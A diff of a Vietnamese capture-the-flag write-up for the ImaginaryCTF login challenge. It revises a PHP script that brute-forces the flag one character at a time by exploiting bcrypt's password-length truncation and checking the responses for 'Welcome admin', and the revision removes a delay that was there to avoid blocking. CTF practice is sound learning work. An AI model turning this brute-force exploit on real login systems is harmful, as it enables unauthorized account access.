@@ -185,23 +185,24 @@ Sử url thành [http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123
 
 tiến hành viết code để exploit thôi
 
+````php
 ```php
 <?php
 $url = "http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0";
 
-// Mảng lưu trữ các ký tự đã tìm thấy trong flag, ban đầu là các ký tự đã biết "ictf"
-$secret = ["i", "c", "t", "f"];
+// Biến lưu trữ flag, ban đầu rỗng
+$flag = '';
 
 while (true) {
     // Độ dài của ký tự cần brute force, giả sử flag có độ dài là 71 ký tự
-    $length = 71 - count($secret);
+    $length = 71 - strlen($flag);
 
     // Ký tự "overflow" là ký tự filler (tràn), có thể là bất kỳ ký tự nào
     $overflow = str_repeat("A", $length);
 
     // Duyệt qua các ký tự in được (loại bỏ 6 ký tự cuối)
-    foreach (str_split("{0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~") as $c) {
-        $guess = $overflow . implode("", $secret) . $c;
+    foreach (str_split("{|}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!0123456789\"#$%&'()*+,-./:;<=>?@[\\]^_`~") as $c) {
+        $guess = $overflow . $flag . $c;
 
         // Hash password bằng hàm password_hash()
         $hashed_password = password_hash($guess, PASSWORD_BCRYPT);
@@ -229,21 +230,21 @@ while (true) {
 
         // Kiểm tra xem trong response có chuỗi "Welcome admin" hay không
         if (strpos($response, 'Welcome admin') !== false) {
-            // Nếu tìm thấy, thêm ký tự $c vào mảng $secret và tiếp tục vòng lặp
-            $secret[] = $c;
-            echo "[!] found! " . implode("", $secret) . PHP_EOL;
+            // Nếu tìm thấy, thêm ký tự $c vào biến $flag và tiếp tục vòng lặp
+            $flag .= $c;
+            echo "flag :  $flag" . PHP_EOL;
             break;
         } else {
-            echo "trying $c..." . PHP_EOL;
+            echo "flag :  $flag$c" . PHP_EOL;
         }
 
-        // Nghỉ 1 giây để tránh bị chặn
-        sleep(1);
+ 
     }
 }
 ?>
 
 ```
+````
 
 flag:&#x20;
 
